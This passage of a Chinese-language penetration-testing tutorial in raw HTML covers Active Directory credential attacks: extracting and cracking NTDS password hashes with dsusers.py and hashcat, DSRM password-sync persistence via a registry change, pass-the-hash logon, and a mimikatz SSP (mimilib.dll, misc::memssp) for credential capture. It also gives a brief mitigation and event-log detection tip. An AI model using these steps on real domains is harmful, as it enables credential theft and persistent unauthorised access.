python setup.py build &amp;&amp; python setup.py install</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">提取哈希:(这里需要将刚拷出来的三个文件中的系统复制到当前目录下）</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs coffeescript" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">$ dsusers.py ntds.dit.<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">export</span>/datatable<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">.3</span> ntds.dit.<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">export</span>/link_table<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">.5</span> output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">这样提取出来之后已经是转换成hashcat可破解的格式</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">hashcat</span> -m <span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1000</span> ntout ./password.txt</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">&nbsp;</span><span style="font-size:14px;line-height:34px;;color: rgba(0, 0, 0, 0.85);">AD持久化</span></p><h3 name="h3-19" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">活动目录持久性技巧</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1929</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">DS恢复模式密码维护</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://blogs.technet.microsoft.com/askds/2009/03/11/ds-restore-mode-password-maintenance/</span></p><h3 name="h3-20" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">DSRM密码同步</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">DSRM密码同步将域控权限持久化</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">获取到域控权限后如何利用DSRM密码同步将域管权限持久化。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Windows Server 2008需要安装KB961320补丁才能支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">KB961320</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">巧用DSRM密码同步将域控权限持久化</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://drops.xmd5.com/static/drops/tips-9297.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.23046875" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/32_pRB0P99pZetCslw8Mgcq7ErhFPuXSQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVsGvOicQfvaVX0VJRErFCptGuWpRB0P99pZetCslw8Mgcq7ErhFPuXSQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1024" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">同步之后使用法国佬神器（mimikatz）查看KRBTGT用户和SAM中管理员的NTLM值。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">可以看到两个账户的NTLM值相同，说明确实同步成功</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.4106529209621993" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/33_iaE33qXIpUiaiallkU3KX6Uy3IibnQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVoUepCDE4jaArjictNdyf7HUhrHbKeiaE33qXIpUiaiallkU3KX6Uy3IibnQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1164" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span><br  /><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.4234592445328032" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/34_qQB88oFV7FYHrO1YibPViaxrmXQ85Q.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVX19Ek1BnhXpziabNMAkTre1gd8rqQB88oFV7FYHrO1YibPViaxrmXQ85Q/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1006" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">修改注册表允许DSRM账户远程访问</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">修改注册表hkey_local_machineSystemCurrentControlSetControlLsa路径下的DSRMAdminLogonBehavior的值为2。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">系统默认不存在DSRMAdminLogonBehavior，请手动添加。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.5533596837944664" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/35_FIMFPadW403ZicTgGEHcMENThXrnBA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVKW8JYCPOVTZRicyhtbTjCCbDO7FIMFPadW403ZicTgGEHcMENThXrnBA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1012" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用HASH远程登录域控</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.31065759637188206" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/36_y9u38CPibXkV2iaI1MK2D23mHZzX2Q.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVkdBsqhUXu09Yr8O2bLqvECrdiaicy9u38CPibXkV2iaI1MK2D23mHZzX2Q/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1764" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">DSRM账户是域控的本地管理员账户，并非域的管理员帐户。所以DSRM密码同步之后并不会影响域的管理员帐户。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">事件查看器的安全事件中筛选事件ID为4794的事件日志，来判断域管是否经常进行DSRM密码同步操作。</span></p><h3 name="h3-21" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">缓解措施</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">对于这个问题的唯一有效的缓解措施就是确保每一台域控制器的DSRM账户密码是唯一的并且定期修改此密码。同时，确保注册表DsrmAdminLogonBehavior的值不为2，最好将其直接删除或者设置其值为1或0。</span></p><h3 name="h3-22" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">安全支持提供商</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1760</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://www.evil0x.com/posts/11354.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">直译为安全支持提供者又名安全包。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">简单的理解为SSP就是一个DLL，用来实现身份认证</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">将mimilib.dll复制到域控C：/窗/ SYSTEM32下</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">设置SSP</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">修改域控注册表位置：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs coffeescript" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">HKEY_LOCAL_MACHINE<span class="hljs-regexp" style="font-size:14px;line-height:34px;;color: rgb(0, 153, 38);">/System/CurrentControlSet/Control/Lsa/Security Packages/</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.8219424460431655" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/37_gP6I0tS1GZZ0QpCozJLWwsgOVcWGlQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV3bT6rl6ic9ZGVhLE8tKn4KXsfgP6I0tS1GZZ0QpCozJLWwsgOVcWGlQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1112" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;"></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Memory Updating of SSPs</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">privilege::debug</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">misc::memssp</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, 